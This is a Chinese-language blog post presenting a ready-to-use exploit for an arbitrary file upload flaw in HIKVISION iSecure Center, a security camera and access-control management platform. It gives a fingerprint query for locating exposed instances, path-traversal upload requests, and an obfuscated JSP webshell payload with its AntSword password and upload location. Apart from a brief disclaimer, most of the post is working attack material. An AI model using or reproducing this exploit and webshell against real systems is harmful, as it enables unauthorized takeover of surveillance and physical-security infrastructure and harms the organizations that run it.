#  海康威视iSecure Center综合安防管理平台center任意文件上传漏洞   
原创 菜鸟学渗透  菜鸟学渗透   2025-01-06 02:50  
  
# 使用说明：本文章仅用于学习技术研究，请勿用于违法用途，造成任何后果自负与本人无关，请自觉遵守国家法律法规。  
  
1、漏洞描述  
  
  
HIKVISION iSecure Center综合安防管理平台是一套“集成化”、“智能化”的平台，通过接入视频监控、一卡通、停车场、报警检测等系统的设备，获取边缘节点数据，实现安防信息化集成与联动，以电子地图为载体，融合各系统能力实现丰富的智能应用。HIKVISION iSecure Center平台基于“统一软件技术架构”先进理念设计，采用业务组件化技术，满足平台在业务上的弹性扩展。该平台适用于全行业通用综合安防业务，对各系统资源进行了整合和集中管理，实现统一部署、统一配置、统一管理和统一调度。海康威视isecure center 综合安防管理平台存在任意文件上传漏洞  
# 2、影响版本  
  
HIKVISION iSecure Center综合安防管理平台   
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/hZGcrKavvZlicFGxjKy5UB1vV6kKZvp6XKJqlG9QA1M4H8ibDT4U5L1St76H8Ppp0YD6nt0Y6tGaD2Uw6wicIc1bQ/640?wx_fmt=other&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/hZGcrKavvZlicFGxjKy5UB1vV6kKZvp6X3eBDUiaYibgky08h0SgU0qVeyVHibVEicWgorAMEyUibxEibj3DtPficsTG6A/640?wx_fmt=other&from=appmsg "")  
  
3、资产测绘  
```
app="HIKVISION-iSecure-Center"
```  
  
4、漏洞复现  
```
POST /center/api/files;.js HTTP/1.1
Host: 172.16.127.250
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 249
Content-Type: multipart/form-data; boundary=ea26cdac4990498b32d7a95ce5a5135c

--ea26cdac4990498b32d7a95ce5a5135c
Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/test.jsp"
Content-Type: application/octet-stream

test
--ea26cdac4990498b32d7a95ce5a5135c--
```  
```
上传文件位置：
http://xx.xx.xx.xx/clusterMgr/test.jsp;.js
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hZGcrKavvZlicFGxjKy5UB1vV6kKZvp6XiaCk9eszZjKCkMIBInOf3lhiaola2PPn8iceXlSfuhgdVWgPF2308KicTQ/640?wx_fmt=png&from=appmsg "")  
  
EXP｜蚁剑密码：admin  
```
POST /center/api/files;.js HTTP/1.1
Host: 172.16.127.250
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 1187
Content-Type: multipart/form-data; boundary=ea26cdac4990498b32d7a95ce5a5135c

--ea26cdac4990498b32d7a95ce5a5135c
Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/shell1.jsp"
Content-Type: application/octet-stream

<%  String HZ6XV = request.getParameter("admin");if (HZ6XV != null) { class E74vekli extends/*Z5WGL66IkB*/ClassLoader { E74vekli(ClassLoader L902G8) { super(L902G8); } public Class HZ6XV(byte[] b) { returnsuper.defineClass(b, 0, b.length);}}byte[] bytes = null;try {int[] aa = newint[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; Stringccstr="";for (inti=0; i < aa.length; i++) {aa[i] = aa[i] ^ 0x010; ccstr = ccstr + (char) aa[i];}ClassA16iI= Class.forName(ccstr);Stringk=newString(newbyte[]{100,101,99,111,100,101,66,117,102,102,101,114});bytes = (byte[]) A16iI.getMethod(k, String.class).invoke(A16iI.newInstance(), HZ6XV);}catch (Exception e) {bytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(HZ6XV);}ClassaClass=newE74vekli(Thread.currentThread().getContextClassLoader()).HZ6XV(bytes);Objecto= aClass.newInstance();o.equals(pageContext);} else {} %>
--ea26cdac4990498b32d7a95ce5a5135c--
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hZGcrKavvZlicFGxjKy5UB1vV6kKZvp6XSiaicmWHmvu4pichqtMJEECGgJjwkxy7ia7iaOv30ejOfHpbFlX1ibXk9Lzg/640?wx_fmt=png&from=appmsg "")  
```
上传文件位置：
http://xx.xx.xx.xx/clusterMgr/shell1.jsp;.js
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hZGcrKavvZlicFGxjKy5UB1vV6kKZvp6XgzASBbnQJVSV07Pt9JpjbLR9ao5XP1qraKD6ameM9Cp3n8wAwNzX4w/640?wx_fmt=png&from=appmsg "")  
  
  
记得点赞+关注，关注微信公众号  
菜鸟学渗透  
获取最新文章，有任何问题可以后台私信我  
  
有考取NISP一级/二级/三级、CISP-PTE/PTS等证书的可以加我好友私信我（公众号回复“  
加好友  
”）。  
   
  
